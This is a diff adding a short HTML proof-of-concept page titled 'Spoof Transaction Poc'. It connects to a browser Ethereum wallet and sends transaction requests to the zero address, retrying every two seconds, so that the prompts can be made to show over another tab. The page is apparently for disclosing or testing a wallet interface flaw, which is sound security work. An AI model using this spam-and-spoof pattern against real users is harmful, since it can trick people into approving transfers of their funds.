@@ -1,0 +1,49 @@
+<html>
+
+<head>
+    <script>
+        async function connectToSite() {
+            try {
+                await ethereum.request({
+                    method: 'eth_requestAccounts',
+                });
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        async function sendTransaction() {
+            try {
+                const addresses = await ethereum.request({ method: 'eth_accounts' })
+
+                await ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: addresses[0],
+                        to: "0x0000000000000000000000000000000000000000",
+                        value: "0xde0b6b3a76400",
+                        gasLimit: "0x5028",
+                        gasPrice: "0x2540be400",
+                        data: "0x8b888888"
+                    }]
+                })
+            } catch (e) {
+                console.log(e),
+                    setTimeout(sendTransaction, 2000)
+            }
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Spoof Transaction Poc</h1>
+
+    <p>Connecting your wallet and clicking the button below will start sending transaction requests every few seconds.
+        Once this starts, navigate to
+        your tab switcher, and hold another tab.</p>
+
+    <button onclick="connectToSite()">Connect to site</button>
+    <button onclick="sendTransaction()">Send transactions</button>
+</body>
+
+</html>
